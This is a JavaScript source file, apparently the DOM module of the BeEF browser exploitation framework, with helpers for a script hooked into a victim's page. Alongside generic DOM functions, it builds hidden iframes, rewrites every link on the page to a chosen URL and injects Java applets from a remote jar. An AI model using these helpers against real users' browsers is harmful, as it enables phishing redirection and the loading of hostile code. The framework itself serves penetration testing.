/*!
 * @literal object: beef.dom
 *
 * Provides functionalities to manipulate the DOM.
 */
beef.dom = {
	
	/**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "beef-"
	 * @return: generated id
	 */
	generateID: function(prefix) {
		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
	},	
		
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!beef.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},
	
	/**
	 * @param: {String} type: can be one of the following: hidden, fullscreen, custom
	 * @param: {String} method: can be 'get' or 'post'. defaults to get
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iframe has loaded
	 * @return: {Object} the inserted iframe
	 */
	createIframe: function(type, method, params, styles, onload) {
		var css = {};
		var form_submit = (method.toLowerCase() == 'post') ? true : false; 
		if (form_submit && params['src'])
		{
			var form_action = params['src'];
			params['src'] = '';
		}
		if (type == 'hidden') { css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles); }
		if (type == 'fullscreen') { css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px'}, styles); $j('body').css({'padding':'0px', 'margin':'0px'}); }
		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		
		if (form_submit && form_action)
		{
			var id = beef.dom.generateID();
			$j(iframe).attr({'id': id, 'name':id});
			var form = beef.dom.createForm({'action':form_action, 'method':'get', 'target':id}, false);
			$j(form).prependTo('body').submit();
		}
		return iframe;
	},
	
	/**
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
	createForm: function(params, append) {
		var form = $j('<form></form>').attr(params);
		if (append)
			$j('body').append(form);
		return form;
	},
	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	
	/**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},

    /**
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, beef.class.
     * @params: {String} archive: the jar that contains the code.
     * example usage in code:
     * beef.dom.attachApplet('appletId', 'SuperMario3D.class', 'http://127.0.0.1:3000/ui/public/images/target.jar');
     */
    attachApplet: function(id, code, archive){
        var content = null;
        if(beef.browser.isIE()){
           content = "" +
               "<object classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                    "height='350' width='550' > " +
                        "<param name='code' value='" + code + "' />" +
                        "<param name='archive' value='" + archive + "' />" +
                "</object>";
        }else{ // if the hooked browser is not IE, then use the embed tag
             content = "" +
                "<embed id='" + id + "' code='" + code + "' " +
                    "type='application/x-java-applet' archive='" + archive + "' " +
                    "height='350' width='550' >" +
                "</embed>";
        }
        $j('body').append(content);
    },

    /**
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id){
       $j('#' + id + '').detach();
    }
	
};

beef.regCmp('beef.dom');